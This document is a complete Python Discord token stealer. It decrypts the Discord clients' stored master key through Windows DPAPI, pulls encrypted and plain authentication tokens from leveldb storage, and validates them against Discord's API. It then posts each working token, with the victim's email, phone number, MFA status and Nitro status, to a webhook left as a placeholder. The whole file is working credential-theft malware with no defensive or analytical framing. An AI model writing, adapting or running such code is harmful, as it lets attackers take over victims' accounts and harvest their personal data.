import os, re, json, base64, urllib.request
from pathlib import Path
from Crypto.Cipher import AES
import win32crypt

WEBHOOK_URL = "YOUR_WEBHOOK_HERE" 

APP_PATHS = {
    'Discord': r"%APPDATA%\discord",
    'Discord PTB': r"%APPDATA%\discordptb",
    'Discord Canary': r"%APPDATA%\discordcanary"
}

def get_master_key(path):
    try:
        with open(os.path.join(path, "Local State"), "r", encoding="utf-8") as file:
            local_state = json.load(file)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return None

def decrypt_token(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
        return cipher.decrypt(payload)[:-16].decode()
    except:
        return None

def get_user_info(token):
    try:
        headers = {"Authorization": token, "User-Agent": "Mozilla/5.0"}
        req = urllib.request.Request("https://discord.com/api/v10/users/@me", headers=headers)
        with urllib.request.urlopen(req) as res:
            return json.loads(res.read().decode()), token
    except:
        return None, token

def get_nitro_status(token):
    try:
        headers = {"Authorization": token, "User-Agent": "Mozilla/5.0"}
        req = urllib.request.Request("https://discord.com/api/v10/users/@me/billing/subscriptions", headers=headers)
        with urllib.request.urlopen(req) as res:
            return bool(json.loads(res.read().decode()))
    except:
        return False

def send_valid_embed(info, token, has_nitro, source):
    avatar_url = f"https://cdn.discordapp.com/avatars/{info['id']}/{info['avatar']}.png" if info.get('avatar') else "https://cdn.discordapp.com/embed/avatars/0.png"
    embed = {
        "embeds": [{
            "title": f"{info['username']}#{info['discriminator']} • {'Nitro' if has_nitro else 'No Nitro'}",
            "color": 0x57F287,
            "thumbnail": {"url": avatar_url},
            "fields": [
                {"name": "User ID", "value": str(info['id']), "inline": True},
                {"name": "Email", "value": str(info.get('email', 'None')), "inline": True},
                {"name": "Phone", "value": str(info.get('phone', 'None')), "inline": True},
                {"name": "Locale", "value": str(info.get('locale', 'Unknown')), "inline": True},
                {"name": "MFA Enabled", "value": str(info.get('mfa_enabled', False)), "inline": True},
                {"name": "Verified", "value": str(info.get('verified', False)), "inline": True},
                {"name": "Found In", "value": source, "inline": True},
                {"name": "Token", "value": f"```{token[:100]}...```", "inline": False}
            ],
            "footer": {"text": "Valid token • Full info"}
        }]
    }
    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
    req = urllib.request.Request(WEBHOOK_URL, data=json.dumps(embed).encode(), headers=headers)
    urllib.request.urlopen(req)

def send_invalid_embed(token, source):
    embed = {
        "embeds": [{
            "title": "Invalid or Expired Token",
            "description": f"```{token}```",
            "color": 0xED4245,
            "fields": [{"name": "Found In", "value": source, "inline": True}],
            "footer": {"text": "Token could not be validated"}
        }]
    }
    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
    req = urllib.request.Request(WEBHOOK_URL, data=json.dumps(embed).encode(), headers=headers)
    urllib.request.urlopen(req)

def extract_app_tokens():
    found = []
    seen = set()
    for name, raw_path in APP_PATHS.items():
        path = os.path.expandvars(raw_path)
        master_key = get_master_key(path)
        leveldb_path = os.path.join(path, "Local Storage", "leveldb")
        if not os.path.exists(leveldb_path): continue
        for file in os.listdir(leveldb_path):
            if not file.endswith(".log") and not file.endswith(".ldb"): continue
            try:
                with open(os.path.join(leveldb_path, file), "r", errors="ignore") as f:
                    for line in f:
                        line = line.strip()
                        for enc_match in re.findall(r"dQw4w9WgXcQ:([^\"]+)", line):
                            try:
                                encrypted = base64.b64decode(enc_match)
                                token = decrypt_token(encrypted, master_key)
                                if token and token not in seen:
                                    found.append((token, name))
                                    seen.add(token)
                            except: continue
                        for match in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", line):
                            if match not in seen:
                                found.append((match, name))
                                seen.add(match)
            except: continue
    return found

# === MAIN ===
if __name__ == "__main__":
    app_tokens = extract_app_tokens()
    print(f"Found {len(app_tokens)} application token(s).")
    for token, source in app_tokens:
        user_info, _ = get_user_info(token)
        if user_info:
            send_valid_embed(user_info, token, get_nitro_status(token), source)
            print(f"Sent valid app token from {source}")
